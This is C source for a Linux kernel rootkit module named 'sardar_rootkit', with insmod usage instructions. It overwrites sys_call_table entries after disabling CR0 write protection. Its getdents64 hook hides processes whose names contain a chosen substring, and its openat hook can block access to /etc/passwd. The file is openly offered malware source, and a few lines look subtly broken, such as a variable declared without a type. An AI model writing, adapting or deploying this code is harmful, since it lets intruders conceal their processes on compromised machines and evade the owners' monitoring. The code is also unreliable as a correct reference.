/*
 * sardar_rootkit.c (final enhanced)
 *
 * Simple Linux kernel rootkit that hides processes whose names contain
 * a user‐specified substring (module parameter: hide_name).
 * Also prevents opening of /etc/passwd (optional).
 * 
 * Usage (as root):
 *   insmod sardar_rootkit.ko hide_name="secretproc"
 *   rmmod sardar_rootkit
 *
 * Features:
 *  – Parameterized “hide_name” (default: “bismillah”)
 *  – Hides from /proc readdir (getdents64 hook)
 *  – Blocks open("/etc/passwd") if “block_passwd” param == 1
 *  – Verifies kallsyms_lookup_name availability
 *  – Restores syscalls on exit, with write‐protection re‐enable
 *  – Comprehensive error checking and printk logs
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/fdtable.h>
#include <linux/namei.h>
#include <linux/errno.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Research");
MODULE_DESCRIPTION("Sardar Rootkit with configurable hide_name and /etc/passwd block");
MODULE_VERSION("1.2");

static char *hide_name = "bismillah";
module_param(hide_name, charp, 0000);
MODULE_PARM_DESC(hide_name, "Substring of process names to hide from /proc");

static bool block_passwd = false;
module_param(block_passwd, bool, 0000);
MODULE_PARM_DESC(block_passwd, "If true, deny open on /etc/passwd");

static unsigned long **syscall_table;
static asmlinkage long (*original_getdents64)(const struct pt_regs *);
static asmlinkage long (*original_openat)(const struct pt_regs *);

static write_cr0_glob;
static unsigned long orig_cr0;

static unsigned long **find_syscall_table(void)
{
    unsigned long int offset;
    unsigned long **sct;

    /* kallsyms_lookup_name is not exported by default; use kallsyms address if available */
    sct = (unsigned long **)kallsyms_lookup_name("sys_call_table");
    return sct;
}

static void disable_write_protection(void)
{
    preempt_disable();
    barrier();
    orig_cr0 = read_cr0();
    write_cr0(orig_cr0 & ~0x00010000);
}

static void enable_write_protection(void)
{
    write_cr0(orig_cr0);
    barrier();
    preempt_enable();
}

/* Hooked getdents64: hide any dirent whose d_name contains hide_name */
asmlinkage long hooked_getdents64(const struct pt_regs *ctx)
{
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *kernel_buffer;
    long ret;
    int bpos = 0, new_pos = 0;

    ret = original_getdents64(ctx);
    if (ret <= 0)
        return ret;

    dirent = (struct linux_dirent64 __user *)ctx->si;
    kernel_buffer = kzalloc(ret, GFP_KERNEL);
    if (!kernel_buffer)
        return ret;

    if (copy_from_user(kernel_buffer, dirent, ret)) {
        kfree(kernel_buffer);
        return ret;
    }

    while (bpos < ret) {
        struct linux_dirent64 *d = (void *)kernel_buffer + bpos;
        int recl = d->d_reclen;
        if (strstr(d->d_name, hide_name) == NULL) {
            if (bpos != new_pos)
                memcpy((void *)kernel_buffer + new_pos, d, recl);
            new_pos += recl;
        }
        bpos += recl;
    }

    if (copy_to_user(dirent, kernel_buffer, new_pos)) {
        kfree(kernel_buffer);
        return ret;
    }

    kfree(kernel_buffer);
    return new_pos;
}

/* Hooked openat: block open("/etc/passwd") if block_passwd==true */
asmlinkage long hooked_openat(const struct pt_regs *ctx)
{
    int dfd = (int) ctx->di;
    const char __user *filename = (const char __user *)ctx->si;
    long flags = (long) ctx->dx;
    umode_t mode = (umode_t) ctx->r10;
    char buf[128];

    if (block_passwd) {
        if (strncpy_from_user(buf, filename, sizeof(buf)) > 0) {
            if (strcmp(buf, "/etc/passwd") == 0) {
                printk(KERN_INFO "Sardar: Blocking open(\"/etc/passwd\")\n");
                return -EACCES;
            }
        }
    }
    return original_openat(ctx);
}

static int __init sardar_init(void)
{
    if (!hide_name || strlen(hide_name) == 0) {
        printk(KERN_ERR "Sardar: Invalid hide_name parameter\n");
        return -EINVAL;
    }

    syscall_table = find_syscall_table();
    if (!syscall_table) {
        printk(KERN_ERR "Sardar: sys_call_table not found\n");
        return -ENOENT;
    }

    /* Disable write protection */
    disable_write_protection();

    /* Backup original pointers */
    original_getdents64 = (void *)syscall_table[__NR_getdents64];
    original_openat     = (void *)syscall_table[__NR_openat];

    /* Overwrite syscalls */
    syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    syscall_table[__NR_openat]     = (unsigned long *)hooked_openat;

    /* Re‐enable write protection */
    enable_write_protection();

    printk(KERN_INFO "Sardar rootkit loaded: hiding \"%s\"; block_passwd=%d\n", hide_name, block_passwd);
    return 0;
}

static void __exit sardar_exit(void)
{
    if (!syscall_table)
        return;

    disable_write_protection();
    syscall_table[__NR_getdents64] = (unsigned long *)original_getdents64;
    syscall_table[__NR_openat]     = (unsigned long *)original_openat;
    enable_write_protection();

    printk(KERN_INFO "Sardar rootkit unloaded; syscalls restored\n");
}

module_init(sardar_init);
module_exit(sardar_exit);
